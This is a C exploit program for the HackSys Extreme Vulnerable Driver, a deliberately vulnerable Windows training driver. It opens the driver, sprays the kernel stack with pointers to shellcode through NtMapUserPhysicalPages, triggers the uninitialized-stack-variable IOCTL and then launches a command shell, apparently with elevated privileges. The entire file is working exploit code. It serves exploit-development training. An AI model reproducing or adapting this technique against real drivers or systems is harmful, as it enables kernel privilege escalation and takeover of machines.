#include<stdio.h>
#include<Windows.h>

#include "x86-header.h"

#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HEVD_IOCTL_UNINITIALIZED_MEMORY_STACK                    IOCTL(0x80B)


int main()
{
	int NTStatus = 0;
	WORD recvbuf;

	puts("[+] Start...");
	HANDLE hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, NULL, NULL);
	if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL)
	{
		puts("Failed to Open Device");
		return 0;
	}

	DWORD bReturn = 0;
	char buf[4] = { 0 };
	*(PDWORD)(buf) = 0xBAD0B0B0 + 1;

	HMODULE hModule = LoadLibraryA("ntdll.dll");
	if (hModule == 0)
	{
		puts("Failed to load ntdll.dll");
		return 0;
	}

	NtMapUserPhysicalPages = (NtMapUserPhysicalPages_t)GetProcAddress(hModule, "NtMapUserPhysicalPages");
	if (NtMapUserPhysicalPages == NULL)
		return 0;

	PDWORD StackSpray = (PDWORD)malloc(1024 * 4);
	if (StackSpray == NULL)
	{
		puts("[-] Malloc error");
		return 0;
	}
	memset(StackSpray, 0x41, 1024 * 4);

	printf("[+] Spray address is 0x%p\n", StackSpray);

	for (int i = 0; i < 1024; i++)
	{
		*(PDWORD)(StackSpray + i) = (DWORD)&ShellCode;
	}

	NtMapUserPhysicalPages(NULL, 1024, StackSpray);
	DeviceIoControl(hDevice, HEVD_IOCTL_UNINITIALIZED_MEMORY_STACK, buf, 4, NULL, 0, &bReturn, NULL);

	puts("cmd.exe...");
	CreateCmd();

	return 0;
}